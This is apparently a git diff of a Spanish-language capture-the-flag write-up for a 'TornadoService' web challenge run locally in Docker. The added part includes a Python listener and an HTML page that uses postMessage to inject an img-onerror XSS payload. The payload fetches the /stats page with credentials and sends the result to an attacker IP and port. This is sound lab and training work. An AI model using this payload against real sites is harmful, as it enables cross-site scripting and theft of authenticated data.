@@ -1,6 +1,9 @@
 # TornadoService
 
-Primero correr el programa en docker
+Primero correr el programa en docker:
+```bash
+bash build_docker.sh
+```
 
 ![alt text](images/tser1.png)
 
@@ -9,6 +12,11 @@ luego con `http://localhost:1337` se puede ver la pagina:
 ![alt text](images/tser2.png)
 
 El programa parece que hace dos cosas, cambiar el estatus de un tornado y reportar un tornado.
+
+Usando BurpSuite para `Proxy`, `Intercept`, `Open Browser`. Se una el browser para todo lo que sigue, así se puede capturar todo el tráfico.
+
+![alt text](images/tser4.png)
+
 
 Primero se va a revisar el `main.py` como en todos los challenges que se han hecho para ver como funciona y que debilidades hay, ademas de encontar pistas de como obtener el flag.
 
@@ -103,20 +111,56 @@ window.addEventListener("message", (event) => {
     tornadoList.appendChild(listItem);
 });
 ```
-Entonces en la terminal se hace un servidor HTTP con python de donde el bot de selenium va a tomar el payload:
+Entonces realizo un servidor HTTP con python `server.py` de donde el bot de selenium va a tomar el payload:
 
-```bash
-mkdir ~/payload && cd ~/payload
-python3 -m http.server 1337
+```python
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+
+class Handler(SimpleHTTPRequestHandler):
+    def guess_type(self, path):
+        if path.endswith('agent_details'):
+            return 'text/html'
+        return super().guess_type(path)
+
+HTTPServer(('0.0.0.0', 8383), Handler).serve_forever()
 ```
-![alt text](images/tser3.png)
 
-Y hay que obtener el IP del contenedor con:
+Y hay que obtener el IP del contenedor en terminal con:
 
 ```bash
 ip addr show | grep "inet " | grep -v 127
 ```
 
-```bash
-curl "http://localhost:1337/report_tornado?ip=172.17.0.1"
+Se crea un codigo html con los puertos que aprovecha el window.addEventListener("message", ...) en tornado-service.js toma tornado.machine_id y lo mete directo en .innerHTML sin sanitizar. Eso ejecuta un `<img onerror>`.
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  const yourIP = "172.17.0.1"; // Cambia esto por TU IP
+  const yourPort = "8383";
+
+  const xssPayload = `<img src=x onerror="
+    fetch('http://localhost:1337/stats', {credentials:'include'})
+    .then(r=>r.text())
+    .then(d=>{
+      fetch('http://${yourIP}:${yourPort}/?flag='+encodeURIComponent(d))
+    })
+  ">`;
+
+  const win = window.open('http://localhost:1337');
+
+  setTimeout(() => {
+    win.postMessage({
+      machine_id: xssPayload,
+      ip_address: '1.1.1.1',
+      status: 'active'
+    }, '*');
+  }, 3000);
+</script>
+</body>
+</html>
 ```
+
+Disparar el bot desde BurpSuite usando el repeater 
